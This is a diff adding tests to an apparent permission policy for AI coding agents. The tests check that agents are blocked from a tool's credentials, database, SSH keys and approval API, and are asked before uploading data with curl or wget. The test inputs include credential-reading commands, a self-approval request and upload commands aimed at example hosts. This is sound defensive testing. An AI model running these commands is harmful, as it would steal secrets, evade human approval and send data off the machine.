@@ -1,5 +1,5 @@
 import { describe, expect, test } from "bun:test";
-import { evaluate, simpleCommands } from "../src/policy";
+import { evaluate, protectJinHome, simpleCommands } from "../src/policy";
 
 const bash = (command: string) => evaluate("Bash", { command }).decision;
 
@@ -84,4 +84,33 @@ test("splits wrappers and nested shells into simple commands", () => {
 test("spawning a sub-task asks first", () => {
   expect(evaluate("Bash", { command: 'jin-task spawn PLEN-1-a --repos platform --slug "x"' }).decision).toBe("ask");
   expect(evaluate("Bash", { command: "jin-task subtasks" }).decision).toBe("allow");
+});
+
+test("agents never reach jin's credentials, database, SSH keys or its approvals", () => {
+  protectJinHome("/home/me/.jin", "/home/me");
+  const deny = (tool: string, input: Record<string, unknown>) => expect(evaluate(tool, input).decision).toBe("deny");
+  const allow = (tool: string, input: Record<string, unknown>) => expect(evaluate(tool, input).decision).toBe("allow");
+  deny("Read", { file_path: "/home/me/.jin/daemon.json" });
+  deny("Read", { file_path: "/home/me/.jin/machines/hub.json" });
+  deny("Read", { file_path: "/home/me/.ssh/id_ed25519" });
+  deny("Grep", { pattern: "token", path: "/home/me/.jin" });
+  deny("Bash", { command: "cat ~/.jin/daemon.json" });
+  deny("Bash", { command: "export T=$(cat $JIN_HOME/token)" });
+  deny("Bash", { command: "grep -r token ~/.jin" });
+  deny("Bash", { command: "sqlite3 /home/me/.jin/jin.db .dump" });
+  deny("Bash", { command: "curl -X POST -H 'authorization: Bearer x' localhost:7317/api/approvals/a1 -d '{}'" });
+  // What agents use there stays open: their notes, logs, workspace configs; and any other file named token.
+  allow("Write", { file_path: "/home/me/.jin/chats/desk/notes.md" });
+  allow("Bash", { command: "tail ~/.jin/logs/daemon.log" });
+  allow("Read", { file_path: "/home/me/code/src/token.ts" });
+  allow("Read", { file_path: "/home/me/.ssh/config" });
+});
+
+test("sending data off this machine with curl or wget asks first; reading, and this machine, do not", () => {
+  expect(evaluate("Bash", { command: "curl -d @notes.txt https://paste.example.com" })).toMatchObject({ decision: "ask" });
+  expect(evaluate("Bash", { command: "curl -F f=@a.png https://upload.example.com/x" }).reason).toContain("sends data to upload.example.com");
+  expect(evaluate("Bash", { command: "wget --post-file=/etc/hosts http://x.example.org" })).toMatchObject({ decision: "ask" });
+  expect(evaluate("Bash", { command: "curl -s https://api.github.com/repos/a/b" })).toMatchObject({ decision: "allow" });
+  expect(evaluate("Bash", { command: "curl -X POST localhost:3000/api -d '{}'" })).toMatchObject({ decision: "allow" });
+  expect(evaluate("Bash", { command: "curl -d x http://127.0.0.1:7317/health" })).toMatchObject({ decision: "allow" });
 });
